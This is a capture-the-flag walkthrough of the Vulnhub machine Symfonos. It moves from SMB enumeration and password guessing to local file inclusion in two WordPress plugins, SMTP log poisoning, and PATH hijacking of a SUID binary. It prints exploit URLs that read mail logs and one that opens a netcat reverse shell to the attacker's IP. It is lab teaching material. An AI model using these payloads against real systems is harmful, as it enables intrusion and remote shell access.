# Vulnhub-Symfonos

## Rustscan

```bash

22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:    
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos              
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42       
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:41:21:96 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PROT 139/445 (SMB)

I ran `smbmap` to see on which shares I have read access as anonmyous user

<img src="https://i.imgur.com/dbyBxDw.png"/>

So we only have read access to `anomyous`share

<img src="https://imgur.com/FdO20oR.png"/>

We can see there a text so let's download it using `GET`

<img src="https://imgur.com/IeusVl4.png"/>

<img src="https://imgur.com/qxTHIAi.png"/>

This looks like some potential passwords we can use when brute forcing we also have a username `zeus`

Let's run `enum4linux-ng` to enumerate for users

<img src="https://imgur.com/T3xSJ7p.png"/>

<img src="https://imgur.com/T3xSJ7p.png"/>

We only get one user `helios`


## PORT 80 (HTTP)

<img src="https://imgur.com/aHcmbq9.png"/>

On the web server we see this weird image

<img src="https://imgur.com/Gyig2yy.png"/>

There's nothing in the source either , so I started to fuzz for files and directories using `dirsearch`

<img src="https://imgur.com/coUQn2Z.png"/>

But found nothing , so brute forcing is the last resort this is what I'll be doing , we have a username so we could try to brute force against those 3 passwords , if that fails I'll move to rockyou.txt

<img src="https://imgur.com/7ZEomBJ.png"/>

It failed so let's try these 3 passwords on smb as `helios`

<img src="https://i.imgur.com/UFUcygS.png"/>

The first password failed but the second worked and we can access his share now

<img src="https://imgur.com/WkAdtRa.png"/>

After reading `todo.txt` we get a hidden directory

<img src="https://i.imgur.com/23u1uXW.png"/>

<img src="https://imgur.com/mdJ0ngq.png"/>

So this is a wordpress site but the css isn't loaded , we can fix it by seeing where it's grabbing the css file from

<img src="https://i.imgur.com/lQat8r3.png"/>

We need to add a domain `symfonos.local` in `/etc/hosts` file

<img src="https://imgur.com/J3Cg1QD.png"/>

<img src="https://imgur.com/75qfE8k.png"/>

Now it looks better so let's enumerate the wordpress site for that I am going to use `wpscan`

<img src="https://imgur.com/38Utpvl.png"/>

<img src="https://imgur.com/4pgSsPo.png"/>

We have a user `admin` so we could do brute forcing for his password

Also I'll run a scan for enumerating plugins being used on the wordpress site

<img src="https://imgur.com/iJgPymi.png"/>

<img src="https://i.imgur.com/nPc5Dd1.png"/>

We can see two plugins , `mail-masta` and `site-editor`, first I am going to search on mail-masta for any exploits

<img src="https://imgur.com/U13HStT.png"/>

And it seems we found a LFI vulnerability exploit in mail-masta

<img src="https://imgur.com/Qkv2sRC.png"/>

Let's give it a try in reading `/etc/passwd` file through LFI

<img src="https://imgur.com/UBneKm6.png"/>

And boom we got LFI vulnerability here

The other plugin is also vulnerable to LFI

<img src="https://imgur.com/URUgfo1.png"/>

<img src="https://imgur.com/7GDfEFc.png"/>

<img src="https://imgur.com/tJX3Wsa.png"/>

Now we know there that port 25 which is smtp is open so we could see if we could poision it's log files ,so visiting hacktricks I found that it's possible

<img src="https://imgur.com/tZARWq4.png"/>


```
http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios
```

<img src="https://imgur.com/ldtXag7.png"/>

We can read the logs so it's possbile, I followed this article in order to do smtp log poisioning

https://liberty-shell.com/sec/2018/05/19/poisoning/

<img src="https://i.imgur.com/WIp0Tis.png"/>

The sender's mail is just I saw from the logs so I putted there but that important thing to note here is the subject we are putting which is the GET paramtere being executed as shell command. Now if add a paramter along the path of log file

```
http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&pwn=id
```

<img src="https://i.imgur.com/MEus7gW.png"/>

So let's just get a shell with `netcat`

```
http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&hello=nc 192.168.1.2 2222 -e /bin/bash
```


<img src="https://imgur.com/MyNf8DC.png"/>


Now we check if we have permissions to run any command as sudo with `sudo -l`

<img src="https://imgur.com/S3hqUsB.png"/>

No sudo : \

Let's check for any SUID binaries

<img src="https://i.imgur.com/A7xevfb.png"/>

We found `/opt/statuscheck`. On running the binary it results to making a request

<img src="https://i.imgur.com/uzopiXR.png"/>

Let's further analyze the binary if strings is installed on the machine

<img src="https://imgur.com/vWJH99c.png"/>

It is available so we can see what the binary is doing

<img src="https://i.imgur.com/rYBq00N.png"/>

The binary is using a command `curl http://localhost` so we can exploit PATH variable here by making a fake curl binary include `bash` there and including that binary in the PATH variable

<img src="https://imgur.com/ONbshC2.png"/>

<img src="https://imgur.com/e0M1mtG.png"/>

<img src="https://imgur.com/FYNT8NQ.png"/>

However if we run it , we won't get a root shell

<img src="https://imgur.com/WmDykEf.png"/>

I then tried to make bash a SUID

<img src="https://imgur.com/8qRsPL6.png"/>

<img src="https://imgur.com/bKQug8Z.png"/>

It gave me an error, so I was not sure why this wasn't working, so I then just removed the shebang line

<img src="https://imgur.com/cjk76z7.png"/>

Ran it again 

<img src="https://imgur.com/WXIH4qB.png"/>

And boom we have made bash a SUID

<img src="https://imgur.com/Ys3CEDB.png"/>


